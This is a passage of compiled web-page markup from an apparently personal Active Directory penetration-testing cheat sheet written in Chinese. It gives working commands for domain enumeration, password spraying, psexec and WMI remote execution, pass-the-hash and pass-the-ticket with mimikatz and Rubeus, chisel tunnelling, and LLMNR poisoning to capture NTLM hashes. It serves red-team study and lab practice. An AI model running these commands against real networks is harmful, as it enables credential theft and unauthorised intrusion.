445"}),"\n",(0,l.jsxs)(n.li,{children:["smbclient","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"smbclient -L \\\\<ip> -U user%password"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"smbclient -U user \\\\\\\\10.129.42.197\\\\SHARENAME"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["smbmap","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"smbmap -u <user> -d <domain> -p <password> -H <host_ip>"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["Crackmapexec / ",(0,l.jsx)(n.a,{href:"https://github.com/Pennyw0rth/NetExec",children:"nxc"})]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.a,{href:"https://github.com/seriotonctf/cme-nxc-cheat-sheet",children:"https://github.com/seriotonctf/cme-nxc-cheat-sheet"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u7372\u53d6 Domain user lists\uff1a",(0,l.jsx)(n.code,{children:"crackmapexec smb <host_ip> --users"})]}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"crackmapexec smb <host_ip> -u <username> -p <password>"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:'crackmapexec smb <host_ip> -u "user" -p "password" --shares'})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["enum4linux","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"enum4linux -P <Host_IP>"})}),"\n",(0,l.jsxs)(n.li,{children:["\u7372\u53d6 Domain user lists\uff1a",(0,l.jsx)(n.code,{children:'enum4linux -U <Host_IP>  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"'})]}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"enum4linux -u <username> -p <password> <Host_IP>"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["enum4linux-ng","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"enum4linux-ng -P {ip} -oA {output_filename}"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h4,{id:"rpc-port-135",children:"RPC (Port 135)"}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.code,{children:"rpcclient"})," ",(0,l.jsx)(n.strong,{children:"Samba"})," \u5957\u4ef6\u7684\u4e00\u90e8\u5206\uff0c\u53ef\u4ee5\u7528\u4f86\u9023\u63a5\u76ee\u6a19\u4e3b\u6a5f\u4e26\u57f7\u884c\u5404\u7a2e RPC \u64cd\u4f5c\uff0c\u50cf\u662f\u679a\u8209\u4f7f\u7528\u8005\u3001\u7fa4\u7d44\u3001\u5171\u4eab\u8cc7\u6599\u593e\u7b49\u8cc7\u8a0a\u3002"]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u533f\u540d\u767b\u5165\uff1a",(0,l.jsx)(n.code,{children:'rpcclient -U "" -N <ip>'}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:'-U ""'}),"\uff1a\u8868\u793a\u533f\u540d\u9023\u63a5\uff0c\u7121\u9700\u63d0\u4f9b\u4f7f\u7528\u8005\u540d\u7a31\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"-N"}),"\uff1a\u8868\u793a\u4e0d\u8981\u6c42\u5bc6\u78bc\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:["\u53d6\u5f97 Password policy\uff1a",(0,l.jsx)(n.code,{children:"querydominfo"})]}),"\n",(0,l.jsxs)(n.li,{children:["\u5229\u7528 ldap \u533f\u540d\u53d6\u5f97 Domain user lists\uff1a",(0,l.jsx)(n.code,{children:"enumdomusers"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:'./windapsearch.py --dc-ip 172.16.5.5 -u "" -U'})}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u5e33\u865f\u8a8d\u8b49\u9023\u63a5\uff1a",(0,l.jsx)(n.code,{children:'rpcclient -U "username%password" <ip>'})]}),"\n",(0,l.jsxs)(n.li,{children:["\u4e00\u6b21\u6027\u57f7\u884c\u547d\u4ee4\uff1a",(0,l.jsx)(n.code,{children:'rpcclient -U "" -N 10.7.30.21 -c "<command>"'})]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"gpo-enumeration",children:"GPO enumeration"}),"\n",(0,l.jsx)(n.h4,{id:"gpo",children:"GPO"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"\\\\<domain>\\SysVol\\<domain>\\Policie\n\\\\<domain>\\SysVol\\<domain>\\Policie\\<UID>\\Users\\Scripts\n\\\\<domain>\\SysVol\\<domain>\\Policie\\<UID>\\Machine\\Scripts\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u7fa4\u7d44\u539f\u5247","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"Get-NetGPO"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"getuserspnspy",children:"GetUserSPNs[.]py"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u7528\u4f86\u67e5\u8a62\u7db2\u57df\u5167\u7528\u6236\u8a3b\u518a\u7684 SPN","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"Import-Module .\\GetUserSPN.ps1"})}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.li,{children:"\u767c\u52d5 Kerberoasting \u524d\u5075\u67e5"}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"kerbrute",children:"Kerbrute"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u88fd\u4f5c\u5bc6\u78bc\u5674\u7051\u7684 username lists\uff1a",(0,l.jsx)(n.code,{children:"kerbrute userenum -d domain.local --dc <dc-ip> /wordlists.txt"})]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"windows-adreconps1",children:"Windows ADRecon.ps1"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/adrecon/ADRecon",children:"https://github.com/adrecon/ADRecon"})}),"\n",(0,l.jsxs)(n.li,{children:["usage\uff1a",(0,l.jsx)(n.code,{children:"powershell.exe \u2013nop \u2013ep bypass .\\adrecon.ps1 -DomainController <dc-ip> -Credential <user>/<doamin>"})]}),"\n",(0,l.jsx)(n.li,{children:"Install-windowsfeature RSAT"}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"bloodhoundad",children:"BloodHoundAD"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["Windows","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/BloodHoundAD/BloodHound/releases/",children:"https://github.com/BloodHoundAD/BloodHound/releases/"})}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:".\\sharphound.exe -c all"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"SharpHound.ps1"}),"\n",(0,l.jsxs)(n.li,{children:["\u81ea\u52d5\u6253\u5305\uff1a",(0,l.jsx)(n.code,{children:"{Timestamp}_BloodHound.zip"})," --\x3e \u62d6\u5230\u8996\u7a97"]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["Neo4j Server","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://neo4j.com/download-center/#community",children:"https://neo4j.com/download-center/#community"})}),"\n",(0,l.jsx)(n.li,{children:"path/to/neo4j/bin$ ./neo4j console"}),"\n",(0,l.jsx)(n.li,{children:"\u555f\u52d5\u5f8c\u81f3 localhost:7474 \u4fee\u6539\u9810\u8a2d\u5bc6\u78bc"}),"\n",(0,l.jsx)(n.li,{children:"\u9810\u8a2d\u5e33\u5bc6 neo4j/neo4j \u767b\u5165 BloodHoundAD"}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["nxc","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"nxc ldap <ip> -u user -p pass --bloodhound --collection All"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"nxc ldap <ip> -u user -p pass --bloodhound --collection All --dns-server <ip>"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h1,{id:"lateral-movement\u6a6b\u5411\u79fb\u52d5",children:"Lateral Movement(\u6a6b\u5411\u79fb\u52d5)"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u6a6b\u5411\u79fb\u52d5\u4ef0\u8cf4\u5e7e\u7a2e\u7db2\u57df\u5167\u7684\u9a57\u8b49\u65b9\u5f0f\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"NTLM Hash/NTLM v2 Hash"}),"\n",(0,l.jsx)(n.li,{children:"Tickets(Kerberos)"}),"\n",(0,l.jsx)(n.li,{children:"Password"}),"\n",(0,l.jsx)(n.li,{children:"AES256 Keys"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"smb-1",children:"SMB"}),"\n",(0,l.jsx)(n.h3,{id:"psexec",children:"psexec"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"SMB \u958b shell"}),"\n",(0,l.jsxs)(n.li,{children:["\u7b2c\u4e00\u6b21\u4f7f\u7528\u5148\u63a5\u53d7 eula","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"psexec.exe -accepteula"}),"\uff1a",(0,l.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/sysinternals/downloads/psexec",children:"https://docs.microsoft.com/en-us/sysinternals/downloads/psexec"})]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.li,{children:"\u4f7f\u7528 psexec \u4e4b\u524d\u53ef\u4ee5\u5148\u7528 smbmap \u78ba\u8a8d\u6b0a\u9650"}),"\n",(0,l.jsxs)(n.li,{children:["\u6a6b\u5411\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"psexec.exe -accepteula \\\\<ip> -u [<domain>\\]<username> -p <password> cmd"})}),"\n",(0,l.jsxs)(n.li,{children:["impacket\uff1a",(0,l.jsx)(n.a,{href:"https://github.com/SecureAuthCorp/impacket",children:"https://github.com/SecureAuthCorp/impacket"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"impacket-psexec <user>@<ip>"}),"(\u958bshell)"]}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"proxychains psexec.py <username>:<passowrd>@<ip> whoami"})}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"cmenxc",children:"cme/nxc"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"crackmapexec smb [IP] -u administrator -p Passw0rd \u2010\u2010exec\u2010method mmcexec \u2010x 'whoami'"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"--exec-method {mmcexec,smbexec,atexec,wmiexec}"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"\u7db2\u8def\u82b3\u9130",children:"\u7db2\u8def\u82b3\u9130"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u8d70 ",(0,l.jsx)(n.strong,{children:"samba"})," \u5354\u8b70"]}),"\n",(0,l.jsx)(n.li,{children:"Domain admin \u53ef\u4ee5\u4efb\u610f\u89c0\u770b"}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"\\\\<ip>\\c$"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"smbclient -L \\\\<ip>\\c$"})}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"\u639b\u8f09\u9060\u7aef\u78c1\u789f",children:"\u639b\u8f09\u9060\u7aef\u78c1\u789f"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u639b\u8f09\u9060\u7aef\u78c1\u789f","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:'net use \\\\<ip>\\C$ "<password>" /user:<username>'})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u67e5\u770b\u5df2\u639b\u8f09\u7684\u9060\u7aef\u78c1\u789f","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"net use"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["Copy \u6a94\u6848","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"copy mimikatz.exe \\\\<ip>\\C$"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"rdp-\u9060\u7aef\u684c\u9762",children:"RDP \u9060\u7aef\u684c\u9762"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u9810\u8a2d port\uff1aTCP/3389"}),"\n",(0,l.jsxs)(n.li,{children:["\u9810\u8a2d\u60c5\u6cc1\u4e0b\uff0c\u53ea\u6709 ",(0,l.jsx)(n.code,{children:"administrator"})," \u6216 ",(0,l.jsx)(n.code,{children:"Remote Desktop Users \u7fa4\u7d44"})," \u7684\u6210\u54e1\u53ef\u4ee5\u7528 RDP \u9023\u7dda\u3002"]}),"\n",(0,l.jsx)(n.li,{children:"\u6b64\u5916\uff0c\u7ba1\u7406\u54e1\u53ef\u4ee5\u6388\u4e88\u7279\u5b9a\u4f7f\u7528\u8005\u6216\u7fa4\u7d44\u9023\u63a5\u5230 RDP \u7684\u6b0a\u9650\u3002\u56e0\u70ba\u9019\u4e9b\u6b0a\u9650\u662f\u5728\u672c\u5730\u8a2d\u5b9a\u7684\uff0c\u6240\u4ee5\u679a\u8209\u5b83\u5011\u7684\u552f\u4e00\u65b9\u6cd5\u662f\u6211\u5011\u5728\u76ee\u6a19\u96fb\u8166\u4e0a\u64c1\u6709\u7ba1\u7406\u6b0a\u9650\u3002"}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName"})}),"\n",(0,l.jsxs)(n.li,{children:["Enum\uff1a",(0,l.jsx)(n.code,{children:"nxc rdp <subnet> -u user -p 'password' -d <domain>.local"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u986f\u793a\uff1a",(0,l.jsx)(n.code,{children:"Pwn3d!"})," \u4ee3\u8868\u8a72 user \u662f\u6211\u5011\u80fd\u5920\u9023\u9032\u53bb\u7684"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"windows",children:"Windows"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"mstsc.exe"}),"\n",(0,l.jsx)(n.img,{src:"https://hackmd.io/_uploads/Byo3wUHc1e.png",alt:"image"})]}),"\n"]}),"\n",(0,l.jsx)(n.h4,{id:"abuse-restricted-admin-mode",children:"Abuse Restricted Admin Mode"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u9700\u8981\u5148\u63d0\u6b0a\u5230 ",(0,l.jsx)(n.code,{children:"Administrator"})," \u7fa4\u7d44"]}),"\n",(0,l.jsxs)(n.li,{children:["Restricted Admin Mode \u555f\u7528\u6642\u9023\u63a5 RDP \u6703\u7528 network logon \uff0c\u800c\u975e interactive logon\uff0c\u9019\u500b\u5dee\u7570\u6700\u4e3b\u8981\u662f\u7528\u4f86\u9632\u6b62\u88ab Credential cache\u3002","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u4e0d\u904e\u9019\u500b\u7279\u6027\u537b\u80fd\u8b93\u653b\u64ca\u8005\u505a pass the hash \u6216 pass the ticket \u505a\u6a6b\u5411\u79fb\u52d5"}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u78ba\u8a8d R.A.M \u662f\u5426\u958b\u555f\uff1a",(0,l.jsx)(n.code,{children:"reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u6709\u958b\u7684\u8a71\u662f ",(0,l.jsx)(n.code,{children:"0"})]}),"\n",(0,l.jsxs)(n.li,{children:["\u6c92\u958b\u7684\u8a71\u662f ",(0,l.jsx)(n.code,{children:"1"})]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u5982\u679c\u662f disable \u7684\u72c0\u614b\u7684\u8a71\uff0c\u5617\u8a66\u958b\u555f\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["Pass the Ticket\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u4f7f\u7528\u524d\uff1a",(0,l.jsx)(n.code,{children:".\\Rubeus.exe createnetonly /program:powershell.exe /show"})]}),"\n",(0,l.jsxs)(n.li,{children:["\u751f\u6210\u9280\u7968\uff1a",(0,l.jsx)(n.code,{children:".\\Rubeus.exe asktgt /user:<user> /rc4:<NT hash> /domain:<domain>.local /ptt"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u9280\u7968\u662f\u5229\u7528 NT hash \u505a key \u53bb\u52a0\u5bc6Kerberos \u7968\u8b49"}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"/ptt"}),"\uff1a\u76f4\u63a5 inject \u5230\u7576\u524d session \u4e2d\uff0c\u56e0\u6b64\u5728\u7576\u524d\u7684 powershell \u4e2d\u518d\u6253\u958b ",(0,l.jsx)(n.code,{children:"mstsc.exe /restrictedAdmin"})," \uff0c\u5373\u53ef\u79fb\u52d5\u6210\u529f\u3002"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"linux",children:"Linux"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["xfreerdp \u4e0b\u8f09\uff1a",(0,l.jsx)(n.code,{children:"sudo apt-get install freerdp2-x11"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"xfreerdp /u:<user> /p:'<password>' /v:<Host_IP> /d:<domain>.local /dynamic-resolution /drive:.,linux"})}),"\n",(0,l.jsxs)(n.li,{children:["Optimizing xfreerdp\uff1a",(0,l.jsx)(n.code,{children:"xfreerdp /u:<user> /p:'Password' /d:<domain>.local /v:<ip> /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache"})]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["Pivoting to PTH","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["Linux(\u76ee\u524d\u7684\u4e3b\u6a5f)\uff1a","\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"vim /etc/proxychains.conf"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"./chisel server --reverse "})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["Windows(\u958b\u653erdp\u7684\u4e3b\u6a5f)\uff1a","\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"chisel.exe client <VPN IP> R:socks"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["Pass the Hash (Linux --\x3e Windows)\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"proxychains4 -q xfreerdp /u:<user> /pth:<NT hash> /d:<domain>.local /v:<rdp_target_ip>"})}),"\n",(0,l.jsx)(n.li,{children:"\u57f7\u884c\u5b8c\u624d\u80fd\u62ff\u5230\u8a72\u53f0\u7684shell"}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["Pass the Ticket (Windows --\x3e Windows \u4e5f\u53ef\u4ee5 PTH)","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:".\\Rubeus.exe createnetonly /program:powershell.exe /show"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:".\\Rubeus.exe asktgt /user:<user> /rc4:<NTLM> /domain:<Domain>.local /ptt"})}),"\n",(0,l.jsxs)(n.li,{children:["\u9023\u63a5rdp\uff1a",(0,l.jsx)(n.code,{children:"mstsc.exe /restrictedAdmin"})]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"wmi",children:"WMI"}),"\n",(0,l.jsx)(n.h3,{id:"pass-the-hash",children:"Pass the Hash"}),"\n",(0,l.jsxs)(n.p,{children:["kali\uff1a",(0,l.jsx)(n.code,{children:"pth-winexe"})," ",(0,l.jsx)(n.a,{href:"https://github.com/byt3bl33d3r/pth-toolkit/tree/master",children:"https://github.com/byt3bl33d3r/pth-toolkit/tree/master"})]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u7121\u6cd5\u904e Proxychains"}),"\n",(0,l.jsx)(n.li,{children:"\u985e\u4f3c Psexec\uff0c\u4f46\u652f\u63f4\u4ee5 Hash \u4ee3\u66ff\u5bc6\u78bc"}),"\n",(0,l.jsxs)(n.li,{children:["usage\uff1a",(0,l.jsx)(n.code,{children:"pth-winexe -U <domain>/<username>%aad3b435b51404eeaad3b435b51404ee(LM_Hash):<NTLM Hash> //<IP> cmd.exe"})]}),"\n"]}),"\n",(0,l.jsxs)(n.p,{children:["On Windows\uff1a\n",(0,l.jsx)(n.code,{children:"wmiexec.exe"}),"\uff1a",(0,l.jsx)(n.a,{href:"https://github.com/maaaaz/impacket-examples-windows/blob/master/wmiexec.exe",children:"https://github.com/maaaaz/impacket-examples-windows/blob/master/wmiexec.exe"})]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.code,{children:"wmiexec.exe -hashes <LM>:<NTLM> <domain>/<username>@<ip> <command>"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["Mimikatz\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["must dump hashes first\uff1a",(0,l.jsx)(n.code,{children:"sekurlsa::pth/user:Administrator/domain:atomic.local/ntlm:cc36cf7a8514893efccd3324464tkg1a"})]}),"\n",(0,l.jsxs)(n.li,{children:["Kerberos Ticket attack\n",(0,l.jsx)(n.code,{children:"kerberos::ptt Administrator@krbtgt-atomic.LOCAL.kirbi"})]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"winrm",children:"WINRM"}),"\n",(0,l.jsx)(n.h3,{id:"powershell-remotingwindows-remote-management",children:"PowerShell Remoting(Windows Remote Management)"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"PowerShell Remoting only allows connections from members of the Administrators group"}),"\n",(0,l.jsx)(n.li,{children:"Members of the Remote Management Users group can access WMI resources over management protocols"}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["PowerShell Remoting (and WinRM) listen on the following ports:","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"HTTP:5985"}),"\n",(0,l.jsx)(n.li,{children:"HTTPS:5986"}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["Recon\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"crackmapexec winrm <host_ip> -u user.list -p password.list"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["tools\uff1a",(0,l.jsx)(n.a,{href:"https://github.com/Hackplayers/evil-winrm",children:"https://github.com/Hackplayers/evil-winrm"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"sudo gem install evil-winrm"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"evil-winrm -i <target-IP> -u <username> -p <password>"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"dcom",children:"DCOM"}),"\n",(0,l.jsx)(n.h2,{id:"ssh",children:"SSH"}),"\n",(0,l.jsx)(n.h2,{id:"mssql",children:"MSSQL"}),"\n",(0,l.jsx)(n.h2,{id:"exchange",children:"Exchange"}),"\n",(0,l.jsx)(n.h2,{id:"sccm",children:"SCCM"}),"\n",(0,l.jsx)(n.h2,{id:"llmnr--nbt-ns-poisoning",children:"LLMNR & NBT-NS Poisoning"}),"\n",(0,l.jsx)(n.h3,{id:"linux-1",children:"Linux"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["Responder\uff1a",(0,l.jsx)(n.a,{href:"https://github.com/SpiderLabs/Responder",children:"https://github.com/SpiderLabs/Responder"})," (Kali \u9810\u8a2d\u6709\u88dd)"]}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"responder -I <\u7db2\u5361>"})}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"windows-1",children:"Windows"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["Inveigh.ps1\uff1a",(0,l.jsx)(n.a,{href:"https://github.com/Kevin-Robertson/Inveigh",children:"https://github.com/Kevin-Robertson/Inveigh"})]}),"\n",(0,l.jsxs)(n.li,{children:["1.",(0,l.jsx)(n.code,{children:"Import-Module .\\Inveigh.ps1"})]}),"\n",(0,l.jsxs)(n.li,{children:["2.",(0,l.jsx)(n.code,{children:"Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y"})]}),"\n",(0,l.jsxs)(n.li,{children:["\u67e5\u770b\u5229\u7528\u53c3\u6578\uff1a",(0,l.jsx)(n.code,{children:"(Get-Command Invoke-Inveigh).Parameters"})]}),"\n",(0,l.jsx)(n.li,{children:"\u7372\u53d6 NTLM Hash"}),"\n"]}),"\n",(0,l.jsx)(n.h1,{id:"exploitation",children:"Exploitation"}),"\n",(0,l.jsx)(n.h2,{id:"krbrelayup",children:"KrbRelayUp"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/dirkjanm/krbrelayx",children:"https://github.com/dirkjanm/krbrelayx"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/Dec0ne/KrbRelayUp",children:"https://github.com/Dec0ne/KrbRelayUp"})}),"\n",(0,l.jsx)(n.li,{children:"\u5728\u672a\u5f37\u5236\u57f7\u884cLDAP\u7c3d\u540d\u7684\u57df\u74b0\u5883\u4e2d\u53ef\u4ee5\u904b\u4f5c"}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"davrelayup",children:"DavRelayUp"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/Dec0ne/DavRelayUp",children:"https://github.com/Dec0ne/DavRelayUp"})}),"\n",(0,l.jsx)(n.li,{children:"\u900f\u904e\u555f\u7528\u5f9e WebDAV \u5230 LDAP \u7684 NTLM 